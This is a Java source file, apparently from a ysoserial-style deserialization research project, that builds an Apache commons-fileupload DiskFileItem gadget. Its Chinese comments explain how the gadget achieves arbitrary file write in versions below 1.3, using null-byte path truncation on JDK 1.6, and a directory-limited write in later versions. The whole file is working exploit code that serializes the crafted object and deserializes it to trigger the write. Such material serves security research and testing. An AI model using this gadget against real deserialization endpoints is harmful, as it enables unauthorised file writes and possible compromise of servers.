package org.su18.serialize.ysoserial.FileUpload;

import org.apache.commons.fileupload.disk.DiskFileItem;
import org.apache.commons.io.output.DeferredFileOutputStream;
import org.su18.serialize.ysoserial.Utils.SerializeUtil;

import java.io.File;
import java.lang.reflect.Field;

/**
 * 在 1.3 版本以下，配合 JDK 1.6 的空字节截断，可以完成任意文件写入
 * 在 1.3.1 版本以上，由于 readObject 中进行了修复和判断，只能指定目录写入文件内容，且无法控制文件名
 *
 * @author su18
 */
public class FileUploadForWrite {

	public static void main(String[] args) throws Exception {

		// 创建文件写入目录 File 对象，以及文件写入内容
		String charset = "UTF-8";
		byte[] bytes   = "hahaha".getBytes(charset);

		// 在 1.3 版本以下，可以使用 \0 截断
//		File repository = new File("/Users/phoebe/Downloads/123.txt\0");

		// 在 1.3.1 及以上，只能指定目录
		File   repository = new File("/Users/phoebe/Downloads");

		// 创建 dfos 对象
		DeferredFileOutputStream dfos = new DeferredFileOutputStream(0, repository);

		// 使用 repository 初始化反序列化的 DiskFileItem 对象
		DiskFileItem diskFileItem = new DiskFileItem(null, null, false, null, 0, repository);

		// 序列化时 writeObject 要求 dfos 不能为 null
		Field dfosFile = DiskFileItem.class.getDeclaredField("dfos");
		dfosFile.setAccessible(true);
		dfosFile.set(diskFileItem, dfos);

		// 反射将 cachedContent 写入
		Field field2 = DiskFileItem.class.getDeclaredField("cachedContent");
		field2.setAccessible(true);
		field2.set(diskFileItem, bytes);

		SerializeUtil.writeObjectToFile(diskFileItem);
		SerializeUtil.readFileObject();
	}

}
